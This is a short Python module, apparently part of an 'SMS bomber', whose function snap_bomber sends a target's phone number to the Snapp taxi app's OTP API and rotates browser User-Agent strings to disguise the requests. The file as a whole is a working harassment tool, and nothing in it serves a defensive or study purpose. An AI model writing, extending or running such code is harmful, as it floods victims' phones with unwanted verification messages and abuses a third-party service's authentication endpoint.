import requests
from time import sleep
from colorama import Fore as color  
import random
from datetime import datetime

def snap_bomber(number):
    bold = '\033[1m'
    heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
    rhead = random.choice(heads)
    phonenumber = {"cellphone":number}
    url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

    try:
        req = requests.post(url,data=phonenumber, json=rhead)
        time = datetime.now()
        try:
            print(color.GREEN+"[*] Snap Sent...!",end=' ')
            print(color.LIGHTGREEN_EX+ bold +'\t'+str(time.hour)+":"+str(time.minute)+":"+str(time.second))  
        except:
            print(color.RED+"Something Went Wrong...")         
    except:
        print("something went wrong...")

